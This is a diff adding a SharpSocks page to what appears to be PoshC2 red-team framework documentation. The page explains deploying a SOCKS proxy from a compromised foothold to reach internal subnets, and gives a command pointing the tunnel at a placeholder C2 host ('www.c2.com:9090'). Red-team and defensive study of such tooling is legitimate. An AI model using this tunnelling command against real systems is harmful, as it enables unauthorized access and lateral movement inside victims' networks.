@@ -98,7 +98,12 @@
 <li class="toctree-l2"><a class="reference internal" href="wmi.html">WMI</a></li>
 <li class="toctree-l2"><a class="reference internal" href="dcom.html">DCOM</a></li>
 <li class="toctree-l2"><a class="reference internal" href="winrm.html">WinRM</a></li>
-<li class="toctree-l2 current"><a class="current reference internal" href="#">SharpSocks</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">SharpSocks</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#introduction">Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#syntax">Syntax</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#parameters">Parameters</a></li>
+</ul>
+</li>
 <li class="toctree-l2"><a class="reference internal" href="index.html#communication-methods">Communication Methods</a></li>
 </ul>
 </li>
@@ -171,6 +176,29 @@
             
   <div class="section" id="sharpsocks">
 <h1>SharpSocks<a class="headerlink" href="#sharpsocks" title="Permalink to this headline">¶</a></h1>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1071">Standard Application Layer Protocol</a></p>
+<div class="section" id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
+<p>One of the most important tools for a Red Teamer is the SOCKS Proxy. This enables the creation of a tunnel between two machines such that any network traffic forwarded through it appears to have originated from the machine at the end of it. Once a foothold has been gained on a machine, a SOCKS proxy can be deployed between the operators machines and the target in order to access subnets, machines and services that would not normally be directly accessible. This includes being able to RDP to another machine or even to browse the corporate intranet.</p>
+<p><a class="reference external" href="https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks/">https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks</a></p>
+<p>SOCKS support is built into most modern browsers and cURL. However, to use tools like rdesktop or nmap, proxychains on Linux can be used to tunnel the traffic. In order to simulate ProxyChains when using Windows, software such as ProxyCap (<a class="reference external" href="http://www.proxycap.com/">http://www.proxycap.com/</a>) can be used.</p>
+<p>Previously, if a SOCKS was required then another implant, such as Meterpreter, would have to be deployed in order to provide the ability to tunnel TCP traffic into the internal network. We arrived at the decision that deploying a full implant just for SOCKS support is overkill and while e.g. Meterpreter is very good, it is also can be noisy and is not an appropriate representation of most sophisticated threat actors TTPs. Since PoshC2 is our publicly available C2, we wanted to add this ability for the wider world too, just like we have in our internal tooling.</p>
+<p>To deploy SharpSocks use the following command within PoshC2. This also has its own stand-alone module but has been integrated into PoshC2 to work seamlessly. Ensure you have fully configured your C2 proxy to forward traffic back to this host.</p>
+<iframe width="480" height="270" src="https://www.youtube.com/embed/-p_hAgmM90k?feature=oembed" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
+<div class="section" id="syntax">
+<h2>Syntax<a class="headerlink" href="#syntax" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-powershell"><div class="highlight"><pre><span></span><span class="n">SharpSocks</span> <span class="n">-Uri</span> <span class="s2">&quot;http://www.c2.com:9090&quot;</span> <span class="n">-Beacon</span> <span class="n">2000</span> <span class="n">-Insecure</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="parameters">
+<h2>Parameters<a class="headerlink" href="#parameters" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><strong>-Uri</strong> the IP/hostname of the machine to be targeted</li>
+<li><strong>-Beacon</strong> Default beacon time of the socks server</li>
+<li><strong>-Insecure</strong> Allow the use of untrusted SSL certificates</li>
+</ul>
+</div>
 </div>
 
 
